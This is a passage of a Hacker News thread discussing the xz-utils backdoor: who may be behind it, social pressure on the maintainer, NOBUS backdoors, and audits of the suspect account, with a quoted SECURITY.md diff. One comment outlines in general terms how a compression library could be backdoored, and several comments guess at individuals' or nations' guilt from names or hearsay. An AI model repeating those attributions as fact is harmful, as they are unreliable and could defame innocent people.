it will unfortunatly be years until the community actually gets this quality of life feature." "Patches spend years on this mailing list. 5.2.0 release was 7 years ago. There is no reason to think anything is coming soon." "With your current rate, I very doubt to see 5.4.0 release this year. The only progress since april has been small changes to test code. You ignore the many patches bit rotting away on this mailing list. Right now you choke your repo. Why wait until 5.4.0 to change maintainer? Why delay what your repo needs?" "Progress will not happen until there is new maintainer. XZ for C has sparse commit log too. Dennis you are better off waiting until new maintainer happens or fork yourself. Submitting patches here has no purpose these days. The current maintainer lost interest or doesn't care to maintain anymore. It is sad to see for a repo like this." "Is there any progress on this? Jia I see you have recent commits. Why can't you commit this yourself?" "Over 1 month and no closer to being merged. Not a suprise." | | --- | --- | --- | | | |  |  | [mrb](user?id=mrb) [9 months ago](item?id=39869489)   | [root](#39866326) | [parent](#39868881) | [prev](#39882658) | [next](#39869372) [–]  Dated June 2022. Good find! | | --- | --- | --- | | | |  |  | [occamsrazorwit](user?id=occamsrazorwit) [9 months ago](item?id=39869372)   | [root](#39866326) | [parent](#39867535) | [prev](#39868881) | [next](#39868757) [–]  Given the details from another comment [1], it sounds like both maintainers are suspicious. Lasse's behavior has changed recently, and he's been pushing to get Jia Tan's changes into the Linux kernel. It's possible both accounts aren't even run by the original Lasse Collin and Jia Tan anymore. Edit: Also, Github has suspended both accounts. Perhaps they know something we don't. [1] <https://news.ycombinator.com/item?id=39865810#39866275> | | --- | --- | --- | | | |  |  | [gamer191](user?id=gamer191) [9 months ago](item?id=39871200)   | [root](#39866326) | [parent](#39869372) | [next](#39876113) [–]  Where does that comment mention the other maintainer (Lasse Collin)? | | --- | --- | --- | | | |  |  | [occamsrazorwit](user?id=occamsrazorwit) [9 months ago](item?id=39872497)   | [root](#39866326) | [parent](#39871200) | [next](#39876113) [–]  Whoops, I linked the wrong comment. I meant to link this one [1]. Anyway, seems like there's potentially a whole trail of compromised and fake accounts [2]. Someone in a government agency somewhere is pretty disappointed right now. [1] <https://news.ycombinator.com/item?id=39867593> [2] <https://news.ycombinator.com/item?id=39866936> | | --- | --- | --- | | | |  |  | [salamandar](user?id=salamandar) [9 months ago](item?id=39876113)   | [root](#39866326) | [parent](#39869372) | [prev](#39871200) | [next](#39868757) [–]  According to Webarchive, <https://tukaani.org/contact.html> changed very recently (between 11/02/2024 and 29/02/2024) to add Lasse Collin's PGP key fingerprint. That timing is weird, considering his git activity at that time is almost non existent. Although, i checked, this key existed back in 2012. | | --- | --- | --- | | | |  |  | [Denvercoder9](user?id=Denvercoder9) [9 months ago](item?id=39880330)   | [root](#39866326) | [parent](#39876113) | [next](#39868757) [–]  > considering his git activity at that time is almost non existent Are you looking at the same repositories I am? He's made 88 commits to xz in that time period, two-thirds of the total. | | --- | --- | --- | | | |  |  | [Delk](user?id=Delk) [9 months ago](item?id=39868757)   | [root](#39866326) | [parent](#39867535) | [prev](#39869372) | [next](#39867705) [–]  > I wouldn't be surprised if the state actor interfered with Lasse somehow People could also just get tired after years of active maintainership or become busier with life. Being the sole maintainer of an active open source project on top of work and perhaps family takes either a lot of enthusiasm or a lot of commitment. It's not really a given that people want to (or can) keep doing that forever at the same pace. Someone then spots the opportunity. I have no idea what the story is here but it might be something rather mundane. | | --- | --- | --- | | | |  |  | [janc\_](user?id=janc_) [9 months ago](item?id=39867705)   | [root](#39866326) | [parent](#39867535) | [prev](#39868757) | [next](#39868696) [–]  Or they have just one or a small number of targets, but don’t want the target(s) to know that they were the only target(s), so they backdoor a large number of victims to “hide in the crowd”. I agree that this is likely a state actor, or at least a very large & wealthy private actor who can play the long game… | | --- | --- | --- | | | |  |  | [fullstop](user?id=fullstop) [9 months ago](item?id=39868696)   | [root](#39866326) | [parent](#39867535) | [prev](#39867705) | [next](#39870040) [–]  If anyone here happens to know Lasse, it might be good to check up on him and see how he's doing. | | --- | --- | --- | | | |  |  | [Repulsion9513](user?id=Repulsion9513) [9 months ago](item?id=39870040)   | [root](#39866326) | [parent](#39867535) | [prev](#39868696) | [next](#39868141) [–]  > Generally in the blackhat world, attackers have very precise targets Lol, what > wants to cast a wide net to attack as many as possible. So that fits the profile of a government intelligence agency That's quite backwards. Governments are far more likely to deploy a complex attack against a single target (see also: Stuxnet); other attackers (motivated primarily by money) are far more likely to cast a wide net. | | --- | --- | --- | | | |  |  | [gamer191](user?id=gamer191) [9 months ago](item?id=39871214)   | [root](#39866326) | [parent](#39870040) | [next](#39868141) [–]  > That's quite backwards. Governments are far more likely to deploy a complex attack against a single target (see also: Stuxnet); other attackers (motivated primarily by money) are far more likely to cast a wide net. Governments are well known to keep vulnerabilities hidden (see EternalBlue). Intentionally introducing a vulnerability doesn’t seem that backwards tbh | | --- | --- | --- | | | |  |  | [Repulsion9513](user?id=Repulsion9513) [9 months ago](item?id=39872135)   | [root](#39866326) | [parent](#39871214) | [next](#39868141) [–]  Oh for sure. I'm not suggesting that this wasn't a government actor, although I'd only give you 50/50 odds on it myself. It coulda just been someone with a bunch of time, like phreakers of old. | | --- | --- | --- | | | |  |  | [dist-epoch](user?id=dist-epoch) [9 months ago](item?id=39868141)   | [root](#39866326) | [parent](#39867535) | [prev](#39870040) | [next](#39869124) [–]  According to top comment he committed multiple binary files to xz for the last two years. Most likely this is not the first backdoor, just the first one to be discovered, so it wasn't two years of work until there were results. But I still agree that he's probably a state actor. | | --- | --- | --- | | | |  |  | [bombcar](user?id=bombcar) [9 months ago](item?id=39868589)   | [root](#39866326) | [parent](#39868141) | [next](#39870030) [–]  Don't forget that you could have state actors who are otherwise interested in open source code, and working to actually improve it. In fact, that'd be the best form of deep cover. It'll be interested to watch as people more knowledgable than I pour over every single commit and change. | | --- | --- | --- | | | |  |  | [hobobaggins](user?id=hobobaggins) [9 months ago](item?id=39870633)   | [root](#39866326) | [parent](#39868589) | [next](#39870030) [–]  (not to be overly pedantic, but you probably meant pore, not pour: [https://www.merriam-webster.com/grammar/pore-over-vs-pour-ov...](https://www.merriam-webster.com/grammar/pore-over-vs-pour-over-poor-usage-difference) ) | | --- | --- | --- | | | |  |  | [apitman](user?id=apitman) [9 months ago](item?id=39870030)   | [root](#39866326) | [parent](#39868141) | [prev](#39868589) | [next](#39871239) [–]  If you have a backdoor in a specific piece of software already, what is the purpose of trying to introduce another backdoor (and risk it getting caught)? | | --- | --- | --- | | | |  |  | [dgacmu](user?id=dgacmu) [9 months ago](item?id=39871212)   | [root](#39866326) | [parent](#39870030) | [next](#39870335) [–]  There are two general attack targets I'd use if I had access to a library/binary like xz: (1) A backdoor like this one, which isn't really about its core functions, but about the fact that it's a library linked into critical code, so that you can use it to backdoor \_other things\_. Those are complex and tricky because you have to manipulate the linking/GOT specifically for a target. (2) Insert an exploitable flaw such as a buffer overflow so that you can craft malicious .xz files that result in a target executing code if they process your file. This is a slightly more generic attack vector but that requires a click/download/action. Not every machine or person you want to compromise has an exposed service like ssh, and not every target will download/decompress a file you send to them. These are decently orthogonal attack vectors even though they both involve a library. (Note that there's as yet no evidence for #2 - I'm just noting how I'd try to leverage this to maximum effect if I wanted to.) | | --- | --- | --- | | | |  |  | [dist-epoch](user?id=dist-epoch) [9 months ago](item?id=39870335)   | [root](#39866326) | [parent](#39870030) | [prev](#39871212) | [next](#39871239) [–]  This backdoor targeted only sshd. There could be other backdoors for other targets. | | --- | --- | --- | | | |  |  | [Bulat\_Ziganshin](user?id=Bulat_Ziganshin) [9 months ago](item?id=39871239)   | [root](#39866326) | [parent](#39868141) | [prev](#39870030) | [next](#39869124) [–]  xz is a data compression tool, so it's natural to have compressed files for (de)compression tests. these files are also useful to check that the library we just built works correctly. but they aren't necessary for installation. we may have more sophisticated procedures that will allow us to use some parts of distribution only for tests. This may significantly reduce an attack vector - many projects have huge, sophisticated testing infrastructure where you can hide the entire Wikipedia. | | --- | --- | --- | | | |  |  | [jnxx](user?id=jnxx) [9 months ago](item?id=39869124)   | [root](#39866326) | [parent](#39867535) | [prev](#39868141) | [next](#39871311) [–]  > They want to attack this company or this group of individuals. But someone who backdoors such a core piece of open source infrastructure wants to cast a wide net to attack as many as possible. The stuxnet malware, which compromised Siemens industrial controls to attack specific centrifuges in uranium enrichment plants in Iran, is a counterexample to that. | | --- | --- | --- | | | |  |  | [mrb](user?id=mrb) [9 months ago](item?id=39870379)   | [root](#39866326) | [parent](#39869124) | [next](#39871311) [–]  Stuxnet wasn't similar to this xz backdoor. The Stuxnet creators researched (or acquired) four Windows zero-days, a relatively short-term endeavor. Whereas the xz backdoor was a long-term 2.5 years operation to slowly gain trust from Lasse Collin. But, anyway, I'm sure we can find other counter-examples. | | --- | --- | --- | | | |  |  | [Repulsion9513](user?id=Repulsion9513) [9 months ago](item?id=39872155)   | [root](#39866326) | [parent](#39870379) | [next](#39899517) [–]  If a government wants to cast a wide nest and catch what they can, they'll just throw a tap in some IXP. If a government went to this much effort to plant this vulnerability, they absolutely have targets in mind - just like they did when they went to the effort of researching (or acquiring) four separate Windows zero-days, combining them, and delivering them... | | --- | --- | --- | | | |  |  | [jhugo](user?id=jhugo) [9 months ago](item?id=39899517)   | [root](#39866326) | [parent](#39870379) | [prev](#39872155) | [next](#39871311) [–]  > a long-term 2.5 years operation to slowly gain trust from Lasse Collin Couldn't the account that committed the backdoor have been compromised recently? | | --- | --- | --- | | | |  |  | [Havoc](user?id=Havoc) [9 months ago](item?id=39871311)   | [root](#39866326) | [parent](#39867535) | [prev](#39869124) | [next](#39915920) [–]  Bit much speculating about mistresses and poisoned spouses with well anything to go on... | | --- | --- | --- | | | |  |  | [Muntzer](user?id=Muntzer) [9 months ago](item?id=39915920)   | [root](#39866326) | [parent](#39867535) | [prev](#39871311) | [next](#39882646) [–]  Adding some unreadable binary to the source code is a really dangerous thing to do. We also need tools to quickly detect the addition of indentation symbols that can be easily overlooked. BYW,I had a classmate who used to play DOTA1(on war3) under this name at the University of Science and Technology of China a long time ago, and this was his first girlfriend name (maybe) . His father was a high-ranking official. Then he joined the parent department of the Internal Security Detachment, a secret service that has gained a lot of power in the last few years. I hope I'm not awake . lol. | | --- | --- | --- | | | |  |  | [ibic](user?id=ibic) [9 months ago](item?id=39882646)   | [root](#39866326) | [parent](#39867535) | [prev](#39915920) | [next](#39870399) [–]  Yes, I believe it's an state actor, and the intention of choosing a typical Chinese name Jia Tan is intentially and malicious. | | --- | --- | --- | | | |  |  | [pyrolistical](user?id=pyrolistical) [9 months ago](item?id=39870399)   | [root](#39866326) | [parent](#39867535) | [prev](#39882646) | [next](#39868413) [–]  Literally this <https://xkcd.com/2347/> | | --- | --- | --- | | | |  |  | [5p4n911](user?id=5p4n911) [9 months ago](item?id=39868413)   | [root](#39866326) | [parent](#39867535) | [prev](#39870399) | [next](#39869126) [7 more]  [flagged] | | --- | --- | --- | | | |  |  | [mrb](user?id=mrb) [9 months ago](item?id=39868472)   | [root](#39866326) | [parent](#39868413) | [next](#39869005) [–]  Brand new anon HN account created 17 minutes ago to defend China? Hmm, suspicious :-) | | --- | --- | --- | | | |  |  | [wyldberry](user?id=wyldberry) [9 months ago](item?id=39868613)   | [root](#39866326) | [parent](#39868472) | [next](#39870029) [–]  Plus China does not care about obfuscation. They smash and grab and then deny, deny, deny + counter accuse. | | --- | --- | --- | | | |  |  | [wyldberry](user?id=wyldberry) [9 months ago](item?id=39869178)   | [root](#39866326) | [parent](#39868613) | [next](#39870029) [–]  I love that i get downvoted on this immediately like I haven't worked IR cases from CN threat actors that did just this. | | --- | --- | --- | | | |  |  | [adamrezich](user?id=adamrezich) [9 months ago](item?id=39870029)   | [root](#39866326) | [parent](#39868472) | [prev](#39868613) | [next](#39869005) [–]  To be fair, if I worked for the responsible state and it wasn't China, then this is what I would do to deflect… | | --- | --- | --- | | | |  |  | [fooker](user?id=fooker) [9 months ago](item?id=39869005)   | [root](#39866326) | [parent](#39868413) | [prev](#39868472) | [next](#39868793) [–]  > Though I'm not a malicious actor Yeah, the actor part seems unnecessary now. | | --- | --- | --- | | | |  |  | [rpigab](user?id=rpigab) [9 months ago](item?id=39868793)   | [root](#39866326) | [parent](#39868413) | [prev](#39869005) | [next](#39869126) [–]  Yeah, could be Venezuela. Though I'm not trying to make random statements to create uncertainty and doubt, so take this with a gigantic grain of salt. | | --- | --- | --- | | | |  |  | [2OEH8eoCRo0](user?id=2OEH8eoCRo0) [9 months ago](item?id=39869126)   | [root](#39866326) | [parent](#39867535) | [prev](#39868413) | [next](#39867856) [–]  It's ridiculous to think it's the US as it would be an attack on Red Hat a US company and an attack on Americans. It's a good way to be dragged in front of Congress. | | --- | --- | --- | | | |  |  | [AimHere](user?id=AimHere) [9 months ago](item?id=39869397)   | [root](#39866326) | [parent](#39869126) | [next](#39869310) [–]  Hardly ridiculous. You say that as if members of US government agencies didn't plot terror attacks on Americans (Operation Northwood), steal the medical records of American whistleblowers (Ellsberg), had to be prevented from assassinating American journalists (Gordon Liddy, on Jack Anderson), collude to assassinate American political activists (Fred Hampton), spy on presidential candidates (Watergate), sell weapons to countries who'd allegedly supported groups who'd launched suicide bombing attacks on American soldiers (Iran-Contra), allow drug smugglers to flood the USA with cocaine so that they could supply illegal guns to terrorists abroad on their return trip (Iran-Contra again) and get caught conducting illegal mass-surveillance on American people as a whole (Snowden). Among others. It's super-naive to suggest that government agencies wouldn't act against the interest of American citizens and companies because there might be consequences if they were caught. Most of the instances above actually were instances where the perpetrators did get caught, which is why we know about them. | | --- | --- | --- | | | |  |  | [onthecanposting](user?id=onthecanposting) [9 months ago](item?id=39870990)   | [root](#39866326) | [parent](#39869397) | [next](#39870215) [–]  Caught and, more importantly, nothing bad typically happened to anyone involved. Also worth noting that there is probably a survivorship bias in play. | | --- | --- | --- | | | |  |  | [jonathankoren](user?id=jonathankoren) [9 months ago](item?id=39870215)   | [root](#39866326) | [parent](#39869397) | [prev](#39870990) | [next](#39869458) [–]  You don’t even have to be this conspiratorially minded to believe the NSA is a legitimate suspect here. (For the record, I think literally every intelligence agency on Earth is plausible here.) You kind of lost the thread when you say, “act against the interests of American citizens and companies”. Bro, literally anyone could be using xz, and anyone could be using Red Hat. You’re only “acting against Americans” if you *use it against Americans*. I don’t know who was behind this, but a perfectly plausible scenario would be the NSA putting the backdoor in with an ostensibly Chinese login and then activating on machines hosted and controlled by people outside of the US. Focusing on a specific distro is myopic. Red Hat is *popular*. | | --- | --- | --- | | | |  |  | [cesarb](user?id=cesarb) [9 months ago](item?id=39870566)   | [root](#39866326) | [parent](#39870215) | [next](#39871506) [–]  > but a perfectly plausible scenario would be the NSA putting the backdoor in with an ostensibly Chinese login and then activating on machines hosted and controlled by people outside of the US. There's a term for that: NOBUS (<https://en.wikipedia.org/wiki/NOBUS>). It won't surprise me at all if this backdoor can only be exploited if the attacker has the private key corresponding to a public key contained in the injected code. It also won't surprise me if this private key ends up being stolen by someone else, and used against its original owner. | | --- | --- | --- | | | |  |  | [jonathankoren](user?id=jonathankoren) [9 months ago](item?id=39871168)   | [root](#39866326) | [parent](#39870566) | [next](#39871506) [–]  >It also won't surprise me if this private key ends up being stolen by someone else, and used against its original owner. And that is exactly why backdoored encryption is bad. | | --- | --- | --- | | | |  |  | [eastern](user?id=eastern) [9 months ago](item?id=39871506)   | [root](#39866326) | [parent](#39870215) | [prev](#39870566) | [next](#39869458) [–]  100%. The HN crowd has come a long way from practically hero-worshipping Snowden to automatically assuming that 'state actor' must mean the countries marked evil by the US. | | --- | --- | --- | | | |  |  | [2OEH8eoCRo0](user?id=2OEH8eoCRo0) [9 months ago](item?id=39869458)   | [root](#39866326) | [parent](#39869397) | [prev](#39870215) | [next](#39869310) [–]  I love being called naive. | | --- | --- | --- | | | |  |  | [SadTrombone](user?id=SadTrombone) [9 months ago](item?id=39870024)   | [root](#39866326) | [parent](#39869458) | [next](#39869626) [–]  Seems like an appropriately used descriptor here. | | --- | --- | --- | | | |  |  | [QuantumG](user?id=QuantumG) [9 months ago](item?id=39869626)   | [root](#39866326) | [parent](#39869458) | [prev](#39870024) | [next](#39869310) [–]  Whisper it to me lover. | | --- | --- | --- | | | |  |  | [guinea-unicorn](user?id=guinea-unicorn) [9 months ago](item?id=39869310)   | [root](#39866326) | [parent](#39869126) | [prev](#39869397) | [next](#39869537) [–]  The US has backdoored RSA's RNG and thus endangered the security of American companies. It is naive to think that US intelligence agencies will act in the best interest of US citizens or companies. | | --- | --- | --- | | | |  |  | [tveita](user?id=tveita) [9 months ago](item?id=39870190)   | [root](#39866326) | [parent](#39869310) | [next](#39869756) [–]  Notably that was a "no-one-but-us" backdoor, that requires a specific secret key to exploit. We'll see when someone analyzes the payload further, but presumably this backdoor also triggers on a specific private key. If not there are ways to do it that would look far more like an innocent mistake, like a logic bug or failed bounds check. I can see some arguments that might persuade the NSA to run an attack like this ```   - gathers real world data on detection of supply attacks   - serves as a wake-up call for a software community that has grown complacent on the security impact of dependencies   - in the worst case, if no one finds it then hey, free backdoor ``` | | --- | --- | --- | | | |  |  | [fragmede](user?id=fragmede) [9 months ago](item?id=39869756)   | [root](#39866326) | [parent](#39869310) | [prev](#39870190) | [next](#39869359) [–]  What about the time it was shown they did the reverse (hardened security using math only they knew at the time) for DSA | | --- | --- | --- | | | |  |  | [Dylan16807](user?id=Dylan16807) [9 months ago](item?id=39870221)   | [root](#39866326) | [parent](#39869756) | [next](#39869359) [–]  What about it? There's an implicit "always" in their second sentence, if you're confused by the wording. They aren't positing the equivalent of the guard that only lies. | | --- | --- | --- | | | |  |  | [fragmede](user?id=fragmede) [9 months ago](item?id=39870779)   | [root](#39866326) | [parent](#39870221) | [next](#39869359) [–]  It's an interesting story for those who haven't heard about that an think the NSA could only be up to evil. You may not have read it as the guard only ever lies, but that doesn't stop people from thinking that anyway. | | --- | --- | --- | | | |  |  | [Dylan16807](user?id=Dylan16807) [9 months ago](item?id=39870832)   | [root](#39866326) | [parent](#39870779) | [next](#39869359) [–]  It's an interesting story, but I still don't know what you wanted as an answer to "What about". | | --- | --- | --- | | | |  |  | [2OEH8eoCRo0](user?id=2OEH8eoCRo0) [9 months ago](item?id=39873828)   | [root](#39866326) | [parent](#39870832) | [next](#39869359) [–]  They were responding to: > It is naive to think that US intelligence agencies will act in the best interest of US citizens or companies. With an example of them doing exactly that. | | --- | --- | --- | | | |  |  | [Dylan16807](user?id=Dylan16807) [9 months ago](item?id=39877559)   | [root](#39866326) | [parent](#39873828) | [next](#39869359) [–]  This is addressed very directly by the second paragraph of my first comment. Please adjust your response to take that into account. | | --- | --- | --- | | | |  |  | [fragmede](user?id=fragmede) [9 months ago](item?id=39883244)   | [root](#39866326) | [parent](#39877559) | [next](#39869359) [–]  why are you so fight-y? do you have to be right, or have the last word? what is it? | | --- | --- | --- | | | |  |  | [Dylan16807](user?id=Dylan16807) [9 months ago](item?id=39887004)   | [root](#39866326) | [parent](#39883244) | [next](#39869359) [–]  I'm perfectly willing to have an actual discussion, but someone coming along to ignore what I said is kind of annoying. Is there something more productive that I could have replied with? (I know I could have been less snippy, but I think being snippy is fair there.) | | --- | --- | --- | | | |  |  | [fragmede](user?id=fragmede) [9 months ago](item?id=39891322)   | [root](#39866326) | [parent](#39887004) | [next](#39869359) [–]  No I think that's it. "What about it?" kinda set me off, and then "if you're confused by the wording" was unnecessarily condescending. You coulda just pointed out that just because they did right in the case of DSA, doesn't mean we should actually ever trust them, which I would agree is the correct stance. Mostly I think that story is neat and wanted people to know about it, so I asked a question as a performative writing technique. | | --- | --- | --- | | | |  |  | [Dylan16807](user?id=Dylan16807) [9 months ago](item?id=39912727)   | [root](#39866326) | [parent](#39891322) | [next](#39869359) [–]  "What about it?" is a very real question that I still want to know the answer to. What did you want as a response when you asked that? "If you're confused by the wording" was definitely condescending, but I think interpreting guinea-unicorn's post that way doesn't make sense. Even in your reply you didn't say you think it's the right interpretation, just that someone might believe the NSA could "only be up to evil". That followup gives the impression you were giving an FYI for readers. Which is nice to do, but then the "what about" doesn't fit. So all of that is to say the words "what about" felt like you were deciding to read their post in an unfair way. I'm happy to listen to an alternate explanation! But you ignored my request for why you said that, and I'm honestly kind of confused as to why that's what set you off. So overall I think I think my first post can come across as fighty but I don't think the followups should suggest I'm making things fighty. I think my response to 2OEH8eoCRo0 was fine given the way they were ignoring half of the four sentences I had typed. | | --- | --- | --- | | | |  |  | [2OEH8eoCRo0](user?id=2OEH8eoCRo0) [9 months ago](item?id=39869359)   | [root](#39866326) | [parent](#39869310) | [prev](#39869756) | [next](#39869537) [–]  That is speculation and has never been confirmed. | | --- | --- | --- | | | |  |  | [hex4def6](user?id=hex4def6) [9 months ago](item?id=39869526)   | [root](#39866326) | [parent](#39869359) | [next](#39869473) [–]  You are understating the level of evidence that points to the NSA being fully aware of what it was doing. To be clear, the method of attack was something that had been described in a paper years earlier, the NSA literally had a program (BULLRUN) around compromising and attacking encryption, and there were security researchers at NIST and other places that raised concerns even before it was implemented as a standard. Oh, and the NSA paid the RSA $10 million to implement it. Heck, even the chairman of the RSA implies they got used by the NSA: In an impassioned speech, Coveillo said RSA, like many in industry, has worked with the NSA on projects. But in the case of the NSA-developed algorithm which he didn’t directly name, Coviello told conference attendees that RSA feels NSA exploited its position of trust. In its job, NSA plays two roles, he pointed out. In the information assurance directorate (IAD) arm of NSA, it decides on security technologies that might find use in the government, especially the military. The other side of the NSA is tasked with vacuuming up data for cyber-espionage purposes and now is prepared to take an offensive role in cyber-attacks and cyberwar. “We can’t be sure which part of the NSA we’re working with,” said Coviello with a tone of anguish. He implied that if the NSA induced RSA to include a secret backdoor in any RSA product, it happened without RSA’s consent or awareness. [https://www.networkworld.com/article/687628/security-rsa-chi...](https://www.networkworld.com/article/687628/security-rsa-chief-nsa-exploited-position-of-trust-should-spin-out-security-tech-group.html) | | --- | --- | --- | | | |  |  | [occamsrazorwit](user?id=occamsrazorwit) [9 months ago](item?id=39869473)   | [root](#39866326) | [parent](#39869359) | [prev](#39869526) | [next](#39869537) [–]  What type of confirmation do you want? The documents aren't going to be declassified in the next couple of decades, if ever. I've never heard anyone claim that Dual\_EC\_DRBG is most likely *not* intentionally backdoored, but there's literally no way to confirm because of how its written. If we can't analyze intention from the code, we can look at the broader context for clues. The NSA spent an unusual amount of effort trying to push forward an algorithm that kept getting shot down because it was slower than similar algorithms with no additional benefits (the $10 million deal specified it as a requirement [1]). If you give the NSA the benefit of the doubt, they spent a lot of time and money to... intentionally slow down random number generation?! As an American, I'd prefer a competent NSA than an incompetent NSA that spends my tax dollars to make technology worse for literally no benefit... [1] [https://www.reuters.com/article/us-usa-security-rsa-idUSBRE9...](https://www.reuters.com/article/us-usa-security-rsa-idUSBRE9BJ1C220131220) | | --- | --- | --- | | | |  |  | [mrb](user?id=mrb) [9 months ago](item?id=39869537)   | [root](#39866326) | [parent](#39869126) | [prev](#39869310) | [next](#39871077) [–]  Have you forgotten about the Snowden leaks exposing the surveillance on Americans by the American govt? | | --- | --- | --- | | | |  |  | [threeseed](user?id=threeseed) [9 months ago](item?id=39871091)   | [root](#39866326) | [parent](#39869537) | [next](#39877770) [–]  Every country spies on its own citizens. By comparison America is actually quite timid compared to other countries e.g. UK and the widespread CCTV network. | | --- | --- | --- | | | |  |  | [bpye](user?id=bpye) [9 months ago](item?id=39872101)   | [root](#39866326) | [parent](#39871091) | [next](#39877770) [–]  I'd say that CCTV is quite different to wiretapping. You (generally) wouldn't have the expectation of privacy in a public place, most people would expect that phone calls, messages, etc do remain private. Now, GCHQ is no better than the NSA for that either, but I don't think CCTV is a good comparison. | | --- | --- | --- | | | |  |  | [silpol](user?id=silpol) [9 months ago](item?id=39877770)   | [root](#39866326) | [parent](#39869537) | [prev](#39871091) | [next](#39871077) [–]  While his leaks expose surveillance, he was useful idiot <https://en.wikipedia.org/wiki/Useful_idiot> in hands of Assange club. And it might be event of his saving was trigger for Putin to start war. So no, I'd better see whole camaraderie before court and sentenced. Regardless of 'heroism'. And yes, most of modern supporters of Wikileaks / Assange / Snowden / etc, chanting 'release Assange' and 'pardon Snowden' are useful idiots in hands of tyrannies like BRICS club. | | --- | --- | --- | | | |  |  | [mardifoufs](user?id=mardifoufs) [9 months ago](item?id=39871077)   | [root](#39866326) | [parent](#39869126) | [prev](#39869537) | [next](#39870056) [–]  Yeah as we know, intelligence agencies are very often held accountable in the US. As witnessed by all the individuals that got charged or punished for uh... nevermind. | | --- | --- | --- | | | |  |  | [asveikau](user?id=asveikau) [9 months ago](item?id=39870056)   | [root](#39866326) | [parent](#39869126) | [prev](#39871077) | [next](#39867856) [–]  I'm not very inclined to think this is the US govt, however, you should better acquaint yourself with the morals of some members of Congress. I think the best reason to doubt USG involvement is the ease with which somebody discovered this issue, which is only a month or two old. I feel like NSA etc. knows not to get caught doing this so easily. | | --- | --- | --- | | | |  |  | [jpalomaki](user?id=jpalomaki) [9 months ago](item?id=39867856)   | [parent](#39866326) | [prev](#39867535) | [next](#39866357) [–]  Seems to be a perfect project to hijack. Not too much happening, widely used, long history, single maintainer who no longer has time to manage the project and wants to pass it over. | | --- | --- | --- | | | |  |  | [rwmj](user?id=rwmj) [9 months ago](item?id=39866357)   | [parent](#39866326) | [prev](#39867856) | [next](#39866351) [–]  I handed over all the emails I received to the security team, who I guess will send them "higher". I'll let them analyse it. | | --- | --- | --- | | | |  |  | [bbarnett](user?id=bbarnett) [9 months ago](item?id=39866351)   | [parent](#39866326) | [prev](#39866357) | [next](#39867446) [–]  Yikes indeed. This fix is being rolled out very fast, but what about the entire rest of the codebase? And scripts? I mean, years of access? I'd trust no aspect of this code until a full audit is done, at least of every patch this author contributed. (note: not referring to fedora here, a current fix is required. But just generally. As in, everyone is rolling out this fix, but... I mean, this codebase is poison in my eyes without a solid audit) | | --- | --- | --- | | | |  |  | [bbarnett](user?id=bbarnett) [9 months ago](item?id=39866462)   | [root](#39866326) | [parent](#39866351) | [next](#39866509) [–]  This seems to be the account, correct me if wrong (linked from the security email commit link): <https://github.com/JiaT75> I hope authors of all these projects have been alerted. STest - Unit testing framework for C/C++. Easy to use by simply dropping stest.c and stest.h into your project! libarchive/libarchive - Multi-format archive and compression library Seatest - Simple C based Unit Testing Everything this account has done should be investigated. Woha, is this legit or some sort of scam on Google in some way?: <https://github.com/google/oss-fuzz/pull/11587> edit: I have to be missing something, or I'm confused. The above author seems to be primary contact for xz? Have they just taken over?? Or did the bad commit come from another source, and a legit person applied it? A bit confused here. | | --- | --- | --- | | | |  |  | [tux3](user?id=tux3) [9 months ago](item?id=39866521)   | [root](#39866326) | [parent](#39866462) | [next](#39867280) [–]  The concern about other projects is fine, but let's be careful with attacks directed at the person. Maybe their account is compromised, maybe the username borrows the identity of an innocent person with the same name. Focus on the code, not people. No point forming a mob. (e: post above was edited and is no longer directed at the person. thanks for the edit.) | | --- | --- | --- | | | |  |  | [simiones](user?id=simiones) [9 months ago](item?id=39866665)   | [root](#39866326) | [parent](#39866521) | [next](#39866707) [–]  It's important to focus on people, not just code, when suspecting an adversary. Now, I have no idea if this is the right account, and if it has recently been compromised/sold/lost, or if it has always been under the ownership of the person who committed the backdoor. But IF this is indeed the right account, then it's important to block any further commit from it to any project, no matter how innocuous it seems, and to review thoroughly any past commit. For the most security-conscious projects, it would be a good idea to even consider reverting and re-implementing any work coming from this account if it's not fully understood. An account that has introduced a backdoor is not the same thing as an account who committed a bug. | | --- | --- | --- | | | |  |  | [tux3](user?id=tux3) [9 months ago](item?id=39866763)   | [root](#39866326) | [parent](#39866665) | [next](#39866707) [–]  I agree we should look at the account and its contributions, I make a distinction between the account and the person. Sometimes the distinction is not meaningful, but better safe than sorry. | | --- | --- | --- | | | |  |  | [tsimionescu](user?id=tsimionescu) [9 months ago](item?id=39867529)   | [root](#39866326) | [parent](#39866763) | [next](#39866707) [–]  Oh, agreed then. | | --- | --- | --- | | | |  |  | [kevin\_b\_er](user?id=kevin_b_er) [9 months ago](item?id=39866707)   | [root](#39866326) | [parent](#39866521) | [prev](#39866665) | [next](#39866907) [–]  They appear to have moved carefully to set this up over the course of weeks by setting up the framework to perform this attack. I would now presume this person to be a hostile actor and their contributions anywhere and everywhere must be audited. I would not wait for them to cry 'but my bother did it', because an actual malicious actor would say the same thing. The 'mob' should be pouring over everything they've touched. Audit now and audit aggressively. | | --- | --- | --- | | | |  |  | [bbarnett](user?id=bbarnett) [9 months ago](item?id=39866862)   | [root](#39866326) | [parent](#39866707) | [next](#39866907) [–]  My above post shows the primary domain for xz moving from tukaani.org to xz.tukaani.org. While it's hosted on github: $ host xz.tukaani.org *host xz.tukaani.org is an alias for tukaani-project.github.io.* And originally it was not: $ host tukaani.org *tukaani.org has address 5.44.245.25* (seemingly in Finland) It was moved there in Jan of this year, as per the commit listed in my prior post. By this same person/account. This means that instead of Lasse Collin's more restrictive webpage, an account directly under the control of the untrusted account, is now able to edit the webpage without anyone else's involvement. For example, to make subtle changes in where to report security issues to, and so on. So far I don't see anything nefarious, but at the same time, isn't this the domain/page hosting bad tarballs too? | | --- | --- | --- | | | |  |  | [pja](user?id=pja) [9 months ago](item?id=39867077)   | [root](#39866326) | [parent](#39866862) | [next](#39870153) [–]  This account changed the instructions for reporting security issues in the xz github as their very last commit: ```     commit af071ef7702debef4f1d324616a0137a5001c14c (HEAD -> master, origin/master, origin/HEAD)     Author: Jia Tan <jiat0218@gmail.com>     Date:   Tue Mar 26 01:50:02 2024 +0800          Docs: Simplify SECURITY.md.      diff --git a/.github/SECURITY.md b/.github/SECURITY.md     index e9b3458a..9ddfe8e9 100644     --- a/.github/SECURITY.md     +++ b/.github/SECURITY.md     @@ -16,13 +16,7 @@ the chance that the exploit will be used before a patch is released.      You may submit a report by emailing us at      [xz@tukaani.org](mailto:xz@tukaani.org), or through      [Security Advisories](https://github.com/tukaani-project/xz/security/advisories/new).     -While both options are available, we prefer email. In any case, please     -provide a clear description of the vulnerability including:     -     -- Affected versions of XZ Utils     -- Estimated severity 